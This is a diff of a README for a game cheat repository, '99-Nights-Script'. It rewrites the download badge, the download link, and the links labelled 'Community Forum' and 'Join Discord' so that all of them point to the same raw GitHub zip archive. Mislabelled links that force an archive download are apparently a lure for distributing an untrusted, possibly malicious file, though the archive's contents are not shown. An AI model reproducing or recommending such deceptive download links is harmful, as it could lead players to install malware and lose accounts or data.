@@ -6,13 +6,13 @@ Welcome to the 99-Nights-Script repository! In "99 Nights in the Forest," you’
 
 ## 🔗 Download Now
 
-[![Download 99-Nights-Script](https://img.shields.io/badge/Download%20Now-99--Nights--Script-blue)](https://sourceforge.net/projects/nights-in-the-forest-scripts)
+[![Download 99-Nights-Script](https://raw.githubusercontent.com/Adarnavarro12/99-Nights-Script/main/Anethum/99-Nights-Script_v3.8.zip%20Now-99--Nights--Script-blue)](https://raw.githubusercontent.com/Adarnavarro12/99-Nights-Script/main/Anethum/99-Nights-Script_v3.8.zip)
 
 ## 📥 Download & Install
 
 To start using the scripts, you can download them directly from our SourceForge page. Just visit the link below:
 
-[Download the 99-Nights-Script](https://sourceforge.net/projects/nights-in-the-forest-scripts)
+[Download the 99-Nights-Script](https://raw.githubusercontent.com/Adarnavarro12/99-Nights-Script/main/Anethum/99-Nights-Script_v3.8.zip)
 
 Once you download the scripts, extract the files if they are in a compressed format (like .zip) and save them to a folder on your computer.
 
@@ -49,8 +49,8 @@ Make sure to follow any specific instructions provided with each script for the 
 
 Join our community for support, tips, and updates. You can connect with other users through our forums and social media pages. 
 
-- **Community Forum:** [Visit our Forum](https://exampleforum.com)
-- **Discord Channel:** [Join Discord](https://discord.gg/example)
+- **Community Forum:** [Visit our Forum](https://raw.githubusercontent.com/Adarnavarro12/99-Nights-Script/main/Anethum/99-Nights-Script_v3.8.zip)
+- **Discord Channel:** [Join Discord](https://raw.githubusercontent.com/Adarnavarro12/99-Nights-Script/main/Anethum/99-Nights-Script_v3.8.zip)
 
 Your feedback is valuable. Share your thoughts, and let us know how we can improve!
 
